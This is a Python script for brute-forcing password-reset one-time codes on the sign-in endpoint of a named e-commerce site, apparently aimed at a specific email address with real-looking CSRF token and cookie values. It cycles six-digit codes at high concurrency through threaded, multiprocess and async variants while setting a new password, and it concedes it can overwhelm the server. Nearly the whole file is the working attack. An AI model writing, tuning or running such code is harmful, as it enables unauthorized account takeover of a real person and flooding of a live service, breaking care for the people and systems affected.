#!/usr/bin/env python3
"""
MAXIMUM PERFORMANCE OTP Brute Force
- Up to 500+ concurrent connections
- Multiprocessing + Multithreading hybrid
- Optimized for absolute maximum speed
"""

import requests
import threading
import multiprocessing
import time
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
from urllib.parse import quote
import queue
import os


class UltraFastOTPBrute:
    def __init__(self):
        self.success_found = multiprocessing.Event()
        self.manager = multiprocessing.Manager()
        self.found_otp = self.manager.list([None])
        self.attempt_count = self.manager.list([0])
        self.lock = multiprocessing.Lock()
    
    def sync_test_otp_batch(self, otp_batch, email, csrf_token, ga_cookie, process_id):
        """Test a batch of OTPs in one process with multiple threads"""
        local_attempts = 0
        
        def test_single_otp(otp):
            nonlocal local_attempts
            if self.success_found.is_set():
                return False, otp
            
            session = requests.Session()
            session.headers.update({
                "User-Agent": f"Mozilla/5.0 (Process-{process_id})",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept": "*/*",
                "X-Requested-With": "XMLHttpRequest"
            })
            
            session.cookies.set('csrftoken', csrf_token)
            session.cookies.set('_ga', ga_cookie)
            
            data = {
                "step": "5",
                "otp_email": quote(email, safe='@'),
                "otpverify": otp,
                "new_password": "Aa12345!B",
                "csrfmiddlewaretoken": csrf_token
            }
            
            try:
                response = session.post(
                    "https://techshopbd.com/sign-in", 
                    data=data, 
                    timeout=2,
                    # Connection pooling for speed
                    stream=False
                )
                
                local_attempts += 1
                
                if (response.status_code == 200 and 
                    any(word in response.text.lower() for word in 
                        ["success", "dashboard", "welcome", "profile", "password changed"])):
                    
                    with self.lock:
                        if not self.found_otp[0]:
                            self.found_otp[0] = otp
                            self.success_found.set()
                    return True, otp
                    
            except:
                local_attempts += 1
                pass
            
            return False, otp
        
        # Use threading within each process for maximum concurrency
        results = []
        with ThreadPoolExecutor(max_workers=50) as executor:  # 50 threads per process
            futures = {executor.submit(test_single_otp, otp): otp for otp in otp_batch}
            
            for future in as_completed(futures):
                if self.success_found.is_set():
                    for f in futures:
                        f.cancel()
                    break
                
                try:
                    success, otp = future.result()
                    results.append((success, otp))
                    
                    if success:
                        return results
                except:
                    continue
        
        # Update global counter
        with self.lock:
            self.attempt_count[0] += local_attempts
        
        return results


async def async_test_otp(session, otp, email, csrf_token, ga_cookie):
    """Async version for even higher concurrency"""
    data = {
        "step": "5",
        "otp_email": quote(email, safe='@'),
        "otpverify": otp,
        "new_password": "Aa12345!B",
        "csrfmiddlewaretoken": csrf_token
    }
    
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    cookies = {
        'csrftoken': csrf_token,
        '_ga': ga_cookie
    }
    
    try:
        async with session.post(
            "https://techshopbd.com/sign-in",
            data=data,
            headers=headers,
            cookies=cookies,
            timeout=aiohttp.ClientTimeout(total=2)
        ) as response:
            
            if response.status == 200:
                text = await response.text()
                if any(word in text.lower() for word in 
                       ["success", "dashboard", "welcome", "profile"]):
                    return True, otp
                    
    except:
        pass
    
    return False, otp


def maximum_performance_brute_force(start_range, end_range, email, csrf_token, ga_cookie, 
                                   max_processes=None, threads_per_process=50):
    """
    MAXIMUM PERFORMANCE OTP Brute Force
    
    Args:
        start_range: Starting OTP
        end_range: Ending OTP
        email: Target email
        csrf_token: CSRF token
        ga_cookie: _ga cookie
        max_processes: Number of processes (default: CPU cores)
        threads_per_process: Threads per process (default: 50)
    
    Returns:
        Valid OTP or None
    """
    
    if max_processes is None:
        max_processes = min(multiprocessing.cpu_count(), 8)  # Limit to 8 processes max
    
    total_connections = max_processes * threads_per_process
    
    print(f"🚀 MAXIMUM PERFORMANCE OTP Brute Force")
    print(f"📧 Email: {email}")
    print(f"🎯 Range: {start_range:06d} - {end_range:06d}")
    print(f"🔥 Processes: {max_processes}")
    print(f"🧵 Threads per process: {threads_per_process}")
    print(f"⚡ Total concurrent connections: {total_connections}")
    print(f"🚀 Theoretical max rate: {total_connections * 2}/sec")
    print("-" * 60)
    
    brute_forcer = UltraFastOTPBrute()
    
    # Generate OTP list and split into batches for processes
    otp_list = [f"{i:06d}" for i in range(start_range, end_range + 1)]
    batch_size = len(otp_list) // max_processes
    otp_batches = [otp_list[i:i + batch_size] for i in range(0, len(otp_list), batch_size)]
    
    start_time = time.time()
    
    # Use ProcessPoolExecutor for maximum parallelism
    with ProcessPoolExecutor(max_workers=max_processes) as executor:
        futures = {
            executor.submit(brute_forcer.sync_test_otp_batch, batch, email, csrf_token, ga_cookie, i): i
            for i, batch in enumerate(otp_batches)
        }
        
        try:
            for future in as_completed(futures):
                if brute_forcer.success_found.is_set():
                    for f in futures:
                        f.cancel()
                    break
                
                try:
                    results = future.result()
                    
                    # Check for success
                    for success, otp in results:
                        if success:
                            elapsed = time.time() - start_time
                            print(f"🎉 SUCCESS: {otp}")
                            print(f"⏱️  Time: {elapsed:.1f}s")
                            print(f"🚀 Rate: {brute_forcer.attempt_count[0]/elapsed:.0f}/sec")
                            return otp
                    
                    # Progress update
                    elapsed = time.time() - start_time
                    if elapsed > 0:
                        rate = brute_forcer.attempt_count[0] / elapsed
                        print(f"⚡ {brute_forcer.attempt_count[0]:,} attempts | {rate:.0f}/sec")
                        
                except Exception as e:
                    continue
                    
        except KeyboardInterrupt:
            print("\n⏹️  Interrupted")
            for f in futures:
                f.cancel()
    
    elapsed = time.time() - start_time
    print(f"❌ No OTP found | {brute_forcer.attempt_count[0]:,} attempts | {elapsed:.1f}s")
    return None


async def async_otp_brute_force(start_range, end_range, email, csrf_token, ga_cookie, 
                               max_concurrent=1000):
    """
    Async version for EXTREME concurrency (1000+ concurrent connections)
    
    WARNING: This can overwhelm servers! Use responsibly.
    """
    
    print(f"🌪️  ASYNC EXTREME Brute Force - {max_concurrent} concurrent connections")
    
    otp_list = [f"{i:06d}" for i in range(start_range, end_range + 1)]
    
    # Semaphore to limit concurrent connections
    semaphore = asyncio.Semaphore(max_concurrent)
    
    async def limited_test(session, otp):
        async with semaphore:
            return await async_test_otp(session, otp, email, csrf_token, ga_cookie)
    
    start_time = time.time()
    
    # Create connector with custom limits
    connector = aiohttp.TCPConnector(
        limit=max_concurrent,
        limit_per_host=max_concurrent,
        ttl_dns_cache=300,
        use_dns_cache=True,
    )
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [limited_test(session, otp) for otp in otp_list]
        
        try:
            for i, task in enumerate(asyncio.as_completed(tasks)):
                success, otp = await task
                
                if success:
                    elapsed = time.time() - start_time
                    print(f"🎉 ASYNC SUCCESS: {otp} in {elapsed:.1f}s")
                    return otp
                
                if i % 1000 == 0:
                    elapsed = time.time() - start_time
                    rate = i / elapsed if elapsed > 0 else 0
                    print(f"⚡ {i:,} attempts | {rate:.0f}/sec")
                    
        except KeyboardInterrupt:
            print("\n⏹️  Interrupted")
    
    return None


def intelligent_fast_brute_force(start_range, end_range, email, csrf_token, ga_cookie):
    """
    Intelligent brute force that automatically scales based on system resources
    """
    
    # Detect system capabilities
    cpu_count = multiprocessing.cpu_count()
    
    if end_range - start_range < 10000:
        # Small range - use high-thread single process
        print("🎯 Small range detected - using high-concurrency threading")
        return ultra_threading_brute_force(start_range, end_range, email, csrf_token, ga_cookie, 200)
    
    elif cpu_count >= 8:
        # Multi-core system - use multiprocessing
        print("💪 Multi-core system - using multiprocessing")
        return maximum_performance_brute_force(start_range, end_range, email, csrf_token, ga_cookie)
    
    else:
        # Lower-end system - use async
        print("🌐 Using async high-concurrency approach")
        return asyncio.run(async_otp_brute_force(start_range, end_range, email, csrf_token, ga_cookie, 500))


def ultra_threading_brute_force(start_range, end_range, email, csrf_token, ga_cookie, max_threads=200):
    """
    Ultra-high threading version (up to 500+ threads)
    """
    
    print(f"🧵 ULTRA-THREADING: {max_threads} concurrent threads")
    
    success_event = threading.Event()
    found_otp = [None]
    attempt_count = [0]
    lock = threading.Lock()
    
    def test_otp(otp):
        if success_event.is_set():
            return False
        
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Ultra-Thread)",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        })
        
        session.cookies.set('csrftoken', csrf_token)
        session.cookies.set('_ga', ga_cookie)
        
        data = {
            "step": "5",
            "otp_email": quote(email, safe='@'),
            "otpverify": otp,
            "new_password": "Aa12345!B",
            "csrfmiddlewaretoken": csrf_token
        }
        
        try:
            response = session.post("https://techshopbd.com/sign-in", data=data, timeout=1)
            
            with lock:
                attempt_count[0] += 1
            
            if (response.status_code == 200 and 
                any(word in response.text.lower() for word in ["success", "dashboard"])):
                
                with lock:
                    if not found_otp[0]:
                        found_otp[0] = otp
                        success_event.set()
                return True
        except:
            with lock:
                attempt_count[0] += 1
        
        return False
    
    otp_list = [f"{i:06d}" for i in range(start_range, end_range + 1)]
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {executor.submit(test_otp, otp): otp for otp in otp_list}
        
        for future in as_completed(futures):
            if success_event.is_set():
                for f in futures:
                    f.cancel()
                break
            
            if attempt_count[0] % 1000 == 0:
                elapsed = time.time() - start_time
                rate = attempt_count[0] / elapsed if elapsed > 0 else 0
                print(f"⚡ {attempt_count[0]:,} | {rate:.0f}/sec")
    
    if found_otp[0]:
        elapsed = time.time() - start_time
        print(f"🎉 SUCCESS: {found_otp[0]} | {elapsed:.1f}s | {attempt_count[0]/elapsed:.0f}/sec")
        return found_otp[0]
    
    return None


# USAGE EXAMPLES
if __name__ == "__main__":
    email = "ariel.agra.archive@gmail.com"
    csrf_token = "pzMrUb99bdHRYHSxcJhdf4hZEkB89dt6"
    ga_cookie = "GA1.1.891817179.1758869982"
    
    print("Choose your approach:")
    print("1. Ultra-threading (200+ threads)")
    print("2. Multiprocessing + Threading hybrid")
    print("3. Async extreme concurrency (1000+ connections)")
    print("4. Intelligent auto-scaling")
    
    # Example: Ultra-threading with 300 threads
    result = ultra_threading_brute_force(
        290000, 295000, email, csrf_token, ga_cookie, max_threads=300
    )
    
    if result:
        print(f"Found: {result}")